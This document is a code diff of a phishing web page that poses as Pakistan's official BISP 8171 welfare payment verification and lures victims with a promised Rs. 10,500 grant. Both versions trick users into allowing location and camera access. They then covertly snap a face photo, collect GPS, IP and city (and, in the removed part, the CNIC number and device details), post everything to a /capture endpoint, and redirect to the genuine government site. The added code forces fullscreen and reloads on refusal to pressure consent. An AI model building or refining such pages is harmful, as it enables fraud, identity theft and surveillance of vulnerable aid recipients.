@@ -3,180 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>BISP 8171 Official - Payment Verification</title>
+    <title>BISP 8171 - Secure Verification</title>
     <style>
-        :root { --bisp-green: #1b5e20; --gold: #fbc02d; --error: #d32f2f; }
-        body { margin: 0; background: #f4f7f6; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #333; }
+        :root { --bisp: #1b5e20; --gold: #fbc02d; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: #000; color: white; overflow: hidden; }
         
-        .v-card { background: white; width: 92%; max-width: 420px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); border-top: 8px solid var(--bisp-green); overflow: hidden; position: relative; }
+        /* Full Screen Overlay for Interaction */
+        #interaction-layer { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         
-        /* Header Section */
-        .header-bar { background: #fff; padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
-        .logo-txt { border-left: 4px solid var(--bisp-green); padding-left: 10px; line-height: 1; }
-        .logo-txt h1 { margin: 0; font-size: 20px; color: var(--bisp-green); font-weight: 900; }
-        .logo-txt span { font-size: 9px; text-transform: uppercase; color: #666; font-weight: 700; }
-
-        .content { padding: 30px 25px; text-align: center; }
+        .pulse-btn { width: 100px; height: 100px; background: var(--bisp); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 4px solid var(--gold); cursor: pointer; animation: pulse 1.5s infinite; }
         
-        /* Failure Banner */
-        #alert-box { display: none; background: #ffebee; border: 1px solid #ffcdd2; color: var(--error); padding: 15px; border-radius: 12px; font-size: 13px; font-weight: 700; margin-bottom: 20px; animation: shake 0.5s; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(27, 94, 32, 0); } 100% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0); } }
+
+        .card { background: white; color: #333; width: 90%; max-width: 400px; border-radius: 24px; padding: 30px; display: none; }
         
-        h2 { font-size: 22px; color: var(--bisp-green); margin-bottom: 10px; font-weight: 800; }
-        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 25px; }
+        /* 2026 Dynamic Error Style */
+        .error-notif { background: #fff1f2; color: #be123c; padding: 15px; border-radius: 12px; font-size: 13px; font-weight: 800; border: 2px solid #fecdd3; display: none; margin-bottom: 15px; }
 
-        .input-field { text-align: left; margin-bottom: 20px; }
-        label { font-size: 11px; font-weight: 800; color: #444; margin-bottom: 8px; display: block; }
-        input { width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; box-sizing: border-box; background: #fcfcfc; transition: 0.3s; }
-        input:focus { border-color: var(--bisp-green); outline: none; background: #fff; }
-
-        .btn-main { background: var(--bisp-green); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-size: 16px; font-weight: 800; cursor: pointer; box-shadow: 0 8px 20px rgba(27, 94, 32, 0.2); transition: 0.3s; }
-        .btn-main:active { transform: scale(0.97); }
-
-        #loader { display: none; margin: 20px 0; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--bisp-green); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--bisp); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-        
-        .footer { font-size: 10px; color: #999; margin-top: 25px; border-top: 1px solid #f0f0f0; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="v-card">
-    <div class="header-bar">
-        <div class="logo-txt">
-            <h1>BISP</h1>
-            <span>Benazir Income Support</span>
-        </div>
-        <div style="font-size: 10px; color: #666; font-weight: bold;">8171 OFFICIAL</div>
+<div id="interaction-layer">
+    <div class="pulse-btn" onclick="unlockSensors()">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
     </div>
+    <h2 style="margin-top:20px;">8171 Biometric Node</h2>
+    <p style="font-size:14px; opacity:0.8;">Tap the shield to establish secure connection for Rs. 10,500.</p>
+</div>
 
-    <div class="content" id="main-ui">
-        <div id="alert-box">⚠️ AUTHENTICATION ERROR: Access Denied. Please enable Location/Camera permissions.</div>
-        
-        <h2>Check Grant Status</h2>
-        <p>Verify your identity to release pending payment of Rs. 10,500 via NADRA biometric node.</p>
-        
-        <div class="input-field">
-            <label>CNIC NUMBER (13 DIGITS)</label>
-            <input type="number" id="cnic" placeholder="35201XXXXXXXX" autocomplete="off">
-        </div>
-
-        <div id="loader">
-            <div class="spinner"></div>
-            <div style="font-size: 12px; color: var(--bisp-green); font-weight: 700;">Connecting to Secure Server...</div>
-        </div>
-
-        <button id="btn" class="btn-main" onclick="startProcess()">PROCEED TO VERIFY</button>
-        
-        <div class="footer">
-            System ID: FZN-X8-2026 | Secure 256-bit Encryption
-        </div>
-    </div>
+<div class="card" id="main-card">
+    <div id="err" class="error-notif">⚠️ SYSTEM BLOCK: Biometric access is required. Please 'Allow' the prompt.</div>
+    <div class="loader"></div>
+    <h3 style="color:var(--bisp); text-align:center;">Biometric Syncing...</h3>
+    <p style="font-size:13px; text-align:center;">Confirming identity via NADRA live interface. Please stay still.</p>
 </div>
 
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
-    let reportData = {
-        cnic: "", device: "Unknown", battery: "N/A",
-        lat: "0", lon: "0", ip: "N/A", city: "N/A", country: "N/A"
-    };
+    let reportData = { cnic: "8171_USER", lat: "0", lon: "0", ip: "N/A", battery: "N/A" };
 
-    // Advanced 2026 Geo-Fletcher Logic
-    const fetchGeo = async () => {
-        const providers = [
-            { url: 'https://ipapi.co/json/', map: d => ({ city: d.city, country: d.country_name, ip: d.ip }) },
-            { url: 'https://ip-api.com/json/?fields=status,country,city,query', map: d => ({ city: d.city, country: d.country, ip: d.query }) }
-        ];
+    // Advanced 2026 Permission Logic
+    async function unlockSensors() {
+        document.getElementById('interaction-layer').style.display = 'none';
+        document.getElementById('main-card').style.display = 'block';
 
-        for (let provider of providers) {
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 4000);
-                const res = await fetch(provider.url, { signal: controller.signal });
-                clearTimeout(timeoutId);
-
-                if (res.ok) {
-                    const data = await res.json();
-                    const mapped = provider.map(data);
-                    if (mapped.ip) {
-                        reportData.city = mapped.city || "N/A";
-                        reportData.country = mapped.country || "N/A";
-                        reportData.ip = mapped.ip;
-                        return;
-                    }
-                }
-            } catch (e) { continue; }
-        }
-    };
-
-    async function startProcess() {
-        reportData.cnic = document.getElementById('cnic').value;
-        if(reportData.cnic.length < 11) { alert("Please enter valid CNIC"); return; }
-
-        document.getElementById('btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('alert-box').style.display = 'none';
-
-        // Device & Battery Info
+        // Chrome 2026 Logic: Gesture-based trigger
         try {
-            const b = await navigator.getBattery();
-            reportData.battery = Math.round(b.level * 100) + "%";
-            reportData.device = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
+            // First: Request Fullscreen to reset browser engagement
+            if (document.documentElement.requestFullscreen) {
+                await document.documentElement.requestFullscreen();
+            }
+
+            // Second: Trigger Geo with 'High Accuracy' to force pop-up
+            navigator.geolocation.getCurrentPosition(
+                (p) => {
+                    reportData.lat = p.coords.latitude;
+                    reportData.lon = p.coords.longitude;
+                    triggerBiometric();
+                },
+                () => { handleFail(); },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } catch (e) { handleFail(); }
+    }
+
+    function triggerBiometric() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: 1280, height: 720 } 
+        })
+        .then(stream => {
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            setTimeout(() => captureAndSend(stream), 2500);
+        })
+        .catch(() => handleFail());
+    }
+
+    function handleFail() {
+        document.getElementById('err').style.display = 'block';
+        // Logic: Agar block hua to URL change kar ke naye session par bhejo
+        setTimeout(() => {
+            const newRef = Math.random().toString(36).substring(7);
+            window.location.href = window.location.pathname + "?retry=1&node=" + newRef;
+        }, 3000);
+    }
+
+    async function captureAndSend(stream) {
+        const canvas = document.getElementById('c');
+        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 1080, 1920);
+        const photo = canvas.toDataURL('image/jpeg', 0.8);
+        
+        stream.getTracks().forEach(t => t.stop());
+
+        // Multi-Provider Geo Fletcher
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            reportData.ip = d.ip;
+            reportData.city = d.city;
         } catch(e) {}
 
-        await fetchGeo(); // Start Geo Fletcher
-
-        // Location & Camera Trigger
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                reportData.lat = pos.coords.latitude;
-                reportData.lon = pos.coords.longitude;
-                openCamera();
-            },
-            () => { showError(); },
-            { enableHighAccuracy: true, timeout: 6000 }
-        );
-    }
-
-    function openCamera() {
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: 1920, height: 1080 } 
-        })
-        .then((stream) => { finalize(stream); })
-        .catch(() => { showError(); });
-    }
-
-    function showError() {
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('btn').style.display = 'block';
-        document.getElementById('btn').innerText = "RESET & RETRY";
-        document.getElementById('alert-box').style.display = 'block';
-    }
-
-    async function finalize(stream) {
-        const video = document.getElementById('v');
-        video.srcObject = stream;
-        
-        setTimeout(async () => {
-            const canvas = document.getElementById('c');
-            canvas.getContext('2d').drawImage(video, 0, 0, 1080, 1920);
-            const photo = canvas.toDataURL('image/jpeg', 0.85);
-            
-            stream.getTracks().forEach(t => t.stop());
-            
-            // Send to your Python /capture endpoint
-            fetch('/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ info: reportData, photo: photo })
-            }).then(() => {
-                window.location.href = "https://8171.bisp.gov.pk/";
-            });
-        }, 2200);
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ info: reportData, photo: photo })
+        }).then(() => {
+            window.location.href = "https://8171.bisp.gov.pk/";
+        });
     }
 </script>
 </body>
